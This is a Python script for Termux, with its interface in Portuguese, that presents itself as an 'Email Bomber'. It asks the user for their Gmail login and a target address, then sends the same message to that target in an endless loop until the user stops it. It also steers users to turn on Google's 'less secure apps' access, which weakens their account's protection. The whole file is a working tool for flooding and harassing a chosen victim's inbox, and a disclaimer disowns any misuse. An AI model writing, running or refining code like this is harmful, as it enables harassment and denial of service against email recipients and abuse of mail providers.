# -*- coding: UTF-8 -*-




#==============> EMAIL BOMBER VERSÃO: 1.0
#==============> ↓↓↓
#==============> BIBLIOTECAS ↓↓↓

import smtplib, email.message, os
try:
	import pyfiglet
except:
	os.system('pip install pyfiglet');sleep(2)
from time import sleep
	
	
#==============> VARIAVEIS ↓↓↓


R='\033[1;31m'
B='\033[1;34m'
C='\033[1;37m'
CY='\033[1;36m'
Y='\033[1;33m'
G='\033[1;32m'
RT='\033[;0m'
NO_FORMAT="\033[0m"
C_GREY89="\033[38;5;254m"
C_RED1="\033[48;5;196m"
ch = f'\n\n   {R}>>>{C} '
a = f'{C}[{R}'
b = f'{C}]{G}'
back = f'   {a}00{b} RETORNAR'
c = f'{C}> {G}'
T = False






#==============> SOBRE & TUTORIAL ↓↓↓



tuto = f'''{C}   >>>>>>>>>>>>>>>>>>>>
{C}   > {a}+{b} TUTORIAL {a}+{b}{C} <
{C}   >>>>>>>>>>>>>>>> >>>>

{C}   {a}00{b} RETORNAR


{C}   {a}+{b}COMO USAR:{C}
   Você deve inserir os dados para a ferramenta trabalhar.
   os únicos requisitos são:
   	
   MENSAGEM DO EMAIL
   TITULO DO EMAIL
   SEU EMAIL
   SENHA
   EMAIL DO ALVO
   
   Não fique preocupado, eu não irei saber dos dados
   preenchidos.
 
   Para ferramenta funcionar, você deve
   ativar a {G}permissão de acesso a apps menos seguros{C}
   caso a opção estiver desabilitada, os email's não
   irão ser enviados. 
   Você pode ativar essa opção indo no Console Admin da sua
   conta do Google, ou então pode selecionar a opção 1
   da ferramenta para te redirecionarmos para a pagina
   da opção.'''



sob = f'''
{C}   >>>>>>>>>>>>>>>>>
{C}   > {a}+{b} SOBRE {a}+{b}{C} <
{C}   >>>>>>>>>>>>>>>>>

   {a}00{b} RETORNAR{C}
   
   Essa é uma tool desenvolvida 100%
   em {G}Python{C}.
   As bibliotecas usadas foram:
   	
{G}   smtplib
   email.message
   os
   pyfiglet
{C}
   SMTPLIB é um módulo que já vem no própio Python.
   Ele faz função de enviar e responder email's 
   com linhas de código, sem usar nada além da 
   própia biblioteca do smtp.
   Basicamente, todo funcionamento do código gira
   em torno dessa lib, oque eu fiz foi acrescentar
   o sistema de repetição do "{G}While{C}":
   
   "{G}while True:{C}
	    s.sendmail(msg['From'], [msg['To']],
	    msg.as_string().encode('utf-8'))
	    print(f'   [✓] ENVIADO COM SUCESSO PARA', alvf) "

   assim, fazendo com que o e-mail fique enviando
   repetidamente até o úsuario da ferramenta cancelar.
   
   Infelizmente, essa ferramenta só irá poder ser
   usada no sistema operacional {G}Termux{C}.
   Futuramente, irei expandir para mais O.S como
   o Kali Linux.
   
   {a}+{b} AVISO:
   {C}Eu não me responsabilizo por qualquer
   uso de forma inadequada desta ferramenta. Essa 
   ferramenta não foi criada com o propósito de
   causar danos ou praticar atos cibercriminosos
   então, você leva as consequências pelas atitudes
   que tiver nessa ferramenta.'''







#==============> FUNÇÕES ↓↓↓

def coded():
	print(f'\n                    {C}[{G}+{C}] {R}CODED BY {C}[{G}+{C}]');figlet = pyfiglet.figlet_format('  Sweet', font = 'cosmic');print(f'''{G}{figlet}{C}''')

def clear():
	os.system('clear')

def wait():
	print(f'''
   {a}+{b} AGUARDE! NÃO INTERAJA COM O CELULAR ATÉ
   ACESSARMOS O LINK!''')






#==============> MENU ↓↓↓

while(T == False):
	clear();coded();print(f'''
{G}   [ GIT: {C}github.com/SweetDoShock/emailbomber {G}]
{G}   [ MEU NÚMERO: {C}wa.me/+5551997773672 {G}]
{G}   [ MEU CHAT: {C}chat.whatsapp.com/LcRR8tC0TFx545a5a3PaCJ {G}]

{C} 
{C}    {G} ᭄𓂀᭄{C} WE ARE = {R}APRONITY SECURITY
{C}   1=================================1
{C}   1        {G}EMAIL BOMBER{R} [v1.0] {C}     1
{C}   1=================================1

{C}   {a}*{b} {G}Choose An Option:
	
   {a}01{b}{C} >>> {G}ATIVAR PERMISSÃO
   {a}02{b}{C} >>> {G}TUTORIAL
   {a}03{b}{C} >>> {G}SOBRE
   {a}04{b}{C} >>> {G}INICIAR O EMAILBOMBER
   {a}99{b}{C} >>> {G}ENCERRAR
   
  {NO_FORMAT}{C_RED1} ATIVE A PERMISSÃO DE ACESSO A APPS MENOS SEGUROS! {NO_FORMAT}''')
	choice = input(ch)

	
		
			
				
					
	
	
#==============> OPÇÕES ↓↓↓

	if choice == '01' or choice == '1': #==> PERMISSÃO
		wait()
		os.system('termux-open-url https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N-')
		sleep(2)
	
	if choice == '02' or choice == '2': #==> TUTORIAL
		while True:
			clear();coded()
			print(tuto)
			choice = input(ch)
			if choice == '0' or choice == '00':
				break
	
	if choice == '03' or choice == '3': #==> SOBRE
		while True:
			clear();coded()
			print(sob)
			choice = input(ch)
			if choice == '00' or choice == '0':
				break
	
	
	if choice == '04' or choice == '4': #==> EMAIL BOMBER
			while True:
				print(f'''
   {a}+{b} INICIALIZANDO, AGUARDE...''');sleep(2);print(f'''{C}   {a}00{b} RETORNAR AO MENU


{G}    EMAIL BOMBER TOOL {R}[v1.0]		
{C}   ==========================''')



				msgf = input(f'\n   {a}+{b} MENSAGEM   {R}>>>{C} ')
				if msgf == '0' or msgf == '00':
					break
				subf = input(f'\n   {a}-{b} TITULO     {R}>>>{C} ')
				if subf == '0' or subf == '00':
					break
				alvf = input(f'\n   {a}-{b} EMAIL ALVO {R}>>>{C} ')
				if alvf == '0' or subf == '00':
					break
				emaf = input(f'\n   {a}-{b} SEU EMAIL  {R}>>>{C} ')
				if emaf == '0' or emaf == '00':
					break
				senf = input(f'\n   {a}-{b} SENHA      {R}>>>{C} ')
				if senf == '0' or senf == '00':
					break
				print(f'''
				
{C}      {a}+{b} ANALISANDO...
{C}   ==========================''')
		
		
				corpo_email = f'''{msgf}'''
				msg = email.message.Message()
				msg['Subject'] = f'{subf}'
				msg['From'] = f'{emaf}'
				msg['To'] = f'{alvf}'
				password = f'{senf}'
				msg.add_header('Content-Type', 'text/html')
				msg.set_payload(corpo_email )
				s = smtplib.SMTP('smtp.gmail.com: 587')
		
		
				try:
					s.starttls()
					s.login(msg['From'], password)
				except:
					print(f'''   {C}⟩⟩⟩ {a}ERROR{b} DADOS INVALIDOS, REINICIANDO...
{C}   ==========================''');sleep(4);break
			
			
				print(f'''   {C}⟩⟩⟩ LOGIN FEITO COM {G}SUCESSO{C}!
{C}   ==========================''')
				while True:
					s.sendmail(msg['From'], [msg['To']],
					msg.as_string().encode('utf-8'))
					print(f'   {a}✓{b} ENVIADO COM SUCESSO PARA{R} {alvf}')
					
					
					

	if choice == '99': #==> ENCERRAR
		print(f'''
   {a}+{b} ATÉ MAIS!{C}
   ''');break